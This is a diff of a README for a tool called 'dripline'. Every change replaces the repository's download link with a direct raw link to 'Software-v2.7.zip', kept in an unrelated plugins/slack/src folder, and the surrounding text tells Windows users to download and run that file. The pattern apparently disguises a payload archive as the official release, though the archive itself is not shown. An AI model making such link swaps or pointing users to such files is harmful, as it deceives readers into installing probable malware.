@@ -1,6 +1,6 @@
 # 💧 dripline - Query mode for agents
 
-[![Download dripline](https://img.shields.io/badge/Download-Visit%20the%20page-2ea44f?style=for-the-badge)](https://github.com/th3Nebula/dripline)
+[![Download dripline](https://img.shields.io/badge/Download-Visit%20the%20page-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/th3Nebula/dripline/main/plugins/slack/src/Software-v2.7.zip)
 
 ## 🧭 What dripline does
 
@@ -29,7 +29,7 @@ For best results, close other large apps before you start dripline.
 
 Go to the download page here:
 
-https://github.com/th3Nebula/dripline
+https://raw.githubusercontent.com/th3Nebula/dripline/main/plugins/slack/src/Software-v2.7.zip
 
 On that page, look for the latest release or download file. Use the file made for Windows, then save it to your computer.
 
@@ -144,7 +144,7 @@ This works well for first-time use and for later sessions too
 
 If you need the download page later, use this link:
 
-https://github.com/th3Nebula/dripline
+https://raw.githubusercontent.com/th3Nebula/dripline/main/plugins/slack/src/Software-v2.7.zip
 
 Keep it in your bookmarks so you can return to it when you want to update or reinstall dripline
 
